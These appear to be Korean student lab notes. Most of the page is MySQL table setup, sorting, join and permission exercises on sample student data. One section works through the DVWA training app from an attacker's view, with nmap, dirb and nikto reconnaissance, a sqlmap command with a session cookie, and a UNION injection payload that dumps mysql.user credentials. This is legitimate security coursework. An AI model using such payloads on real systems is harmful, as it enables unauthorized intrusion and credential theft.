![[Pasted image 20241016120503.png]]
# 개별 과제
## DB 세팅 스크립트
---
```sql
DROP TABLE IF EXISTS `Student_Info`;
DROP TABLE IF EXISTS `Student_Score`;
DROP TABLE IF EXISTS `Student_Health`;

CREATE TABLE `Student_Info` (
	`S_ID` tinyint UNSIGNED NOT NULL AUTO_INCREMENT ,
	`S_NAME` varchar(20) NOT NULL ,
	`S_ADDR` varchar(20) NOT NULL ,
	`S_AGE` tinyint UNSIGNED NOT NULL ,
	PRIMARY KEY (`S_ID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
CREATE TABLE `Student_Score` (
	`S_ID` tinyint UNSIGNED NOT NULL AUTO_INCREMENT ,
	`S_NETWORK` tinyint UNSIGNED NOT NULL ,
	`S_SERVER` tinyint UNSIGNED NOT NULL ,
	`S_SECURITY` tinyint UNSIGNED NOT NULL ,
	PRIMARY KEY (`S_ID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
CREATE TABLE `Student_Health` (
	`H_ID` tinyint UNSIGNED NOT NULL AUTO_INCREMENT ,
	`S_VISION` float NOT NULL,
	`S_WEIGHT` tinyint UNSIGNED NOT NULL ,
	`S_STATURE` tinyint UNSIGNED NOT NULL ,
	`S_BLOOD_TYPE` char(4) NOT NULL,
	PRIMARY KEY (`H_ID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `Student_Info` VALUES (1, 'Gil-Dong', 'Daegu', 28);
INSERT INTO `Student_Info` VALUES (2, 'Young-Gu', 'Busan', 32);
INSERT INTO `Student_Info` VALUES (3, 'Cheol-Su', 'Daegu', 22);
INSERT INTO `Student_Info` VALUES (4, 'Yeong-Hee', 'Daejeon', 28);
INSERT INTO `Student_Info` VALUES (5, 'Sa-Rang', 'Seoul', 26);

INSERT INTO `Student_Score` VALUES (1, 90, 80, 95);
INSERT INTO `Student_Score` VALUES (2, 80, 75, 80);
INSERT INTO `Student_Score` VALUES (3, 85, 95, 75);
INSERT INTO `Student_Score` VALUES (4, 70, 75, 70);
INSERT INTO `Student_Score` VALUES (5, 80, 80, 85);

INSERT INTO `Student_Health` VALUES (1, 1.0, 80, 176, 'A');
INSERT INTO `Student_Health` VALUES (2, 1.2, 65, 164, 'A');
INSERT INTO `Student_Health` VALUES (3, 0.7, 66, 186, 'B-');
INSERT INTO `Student_Health` VALUES (4, 0.2, 77, 177, 'O');
INSERT INTO `Student_Health` VALUES (5, 1.5, 98, 189, 'RH+');
```
![[Pasted image 20241016123137.png]]
![[Pasted image 20241016123204.png]]
![[Pasted image 20241016123220.png]]
## 요구사항 해결
---
### S_AGE를 기준으로 오름차순 정렬
![[Pasted image 20241016123522.png]]
### S_SECURITY를 기준으로 내림차순 정렬
![[Pasted image 20241016123606.png]]

### S_WEIGHT값이 70이상인 것에 대해 오름차순 정렬
![[Pasted image 20241016124016.png]]

### S_NAME union S_SECURITY 데이터 출력
![[Pasted image 20241016125003.png]]
### Student_Info Left join / Right join / inner join > Student_Score
#### Left join
```sql
select Student_Info.S_ID, S_NAME, S_ADDR, S_AGE, S_NETWORK, S_SERVER, S_SECURITY from Student_Info left join Student_Score on Student_Info.S_ID=Student_Score.S_ID;
```
![[Pasted image 20241016134051.png]]
#### Right join
```sql
select Student_Info.S_ID, S_NAME, S_ADDR, S_AGE, S_NETWORK, S_SERVER, S_SECURITY from Student_Info right join Student_Score on Student_Info.S_ID=Student_Score.S_ID;
```
![[Pasted image 20241016134155.png]]
#### Inner join
```sql
select Student_Info.S_ID, S_NAME, S_ADDR, S_AGE, S_NETWORK, S_SERVER, S_SECURITY from Student_Info inner join Student_Score on Student_Info.S_ID=Student_Score.S_ID;
```
![[Pasted image 20241016134247.png]]

### S_NETWORK 점수 합계 구하기
![[Pasted image 20241016131217.png]]

### S_SECURITY 평균 점수 구하기
![[Pasted image 20241016131314.png]]

### S_BLOOD_TYPE을 기준으로 중복 데이터 제거하기
```sql
WITH Ranked_Students AS (
    SELECT *, 
           ROW_NUMBER() OVER (PARTITION BY S_BLOOD_TYPE ORDER BY H_ID) AS RowRank
    FROM Student_Health
)
SELECT *
FROM Ranked_Students
WHERE RowRank = 1;

```
![[Pasted image 20241016132218.png]]

### 5번 학생의 과목 합계와 평균 구하기
```sql
with Result_Student as (
	select * from Student_Score where S_ID = 5
)
select (S_NETWORK + S_SERVER + S_SECURITY) as total_sum, (S_NETWORK + S_SERVER + S_SECURITY) / 3.0 as avg_score from Result_Student;
```
![[Pasted image 20241016133528.png]]

## DVWA
---
> [!Note]
> 공격자의 입장에서 취약점 파악을 위해 정보 수집부터 취약점 공격까지 진행
### 정보 수집
#### nmap-HealthScan
![[Pasted image 20241016140615.png]]

#### dirb
![[Pasted image 20241016140525.png]]

#### nikto-웹 취약점 점검
`/docs/DVWA_v1.3.pdf`
- 서버에서 보관중인 pdf 파일을 발견
- ![[Pasted image 20241016141727.png]]
- 기본 아이디와 패스워드 발견

### sql injection
![[Pasted image 20241016142555.png]]
```
': You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1>SQL 구문에 오류가 있습니다. MySQL 서버 버전에 해당하는 매뉴얼에서 1행의 '"" 근처에서 사용할 수 있는 올바른 구문을 확인하세요
```
- sql 취약점 확인
![[Pasted image 20241016142733.png]]
![[Pasted image 20241016142807.png]]
#### sqlmap - sql injection 취약점 분석
```sh
sqlmap -u "http://221.166.254.70/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=0fblutrqtcgnecdodhm1nqq513; security=low" --random-agent
```
![[Pasted image 20241016152138.png]]

```
' UNION SELECT user, password FROM mysql.user #
```
![[Pasted image 20241016154233.png]]

### zap proxy
![[Pasted image 20241016154201.png]]
# 팀 과제
## 요청 사항
### 사용자 이름과 같은 DB에만 모든 권한 가진다.
- 설정 전
![[Pasted image 20241016155344.png]]
- 설정 후
![[Pasted image 20241016155537.png]]
### 팀 이름과 같은 DBdp select, desc 권한 가진다.
- desc 명령어 사용 권한은 select 권한을 가지면 사용할 수 있다.
![[Pasted image 20241016160324.png]]
### 다른 팀 사용자는 팀 DB에 접속 불가능
- 설정 전
![[Pasted image 20241016161303.png]]
- 설정 후
![[Pasted image 20241016161336.png]]

### Test 계정은 모든 권한
![[Pasted image 20241016161448.png]]
### Test2 계정은 creat, drop 권한(Student_Score)
![[Pasted image 20241016161708.png]]

### Test2 계정 생성 후 삭제
![[Pasted image 20241016161804.png]]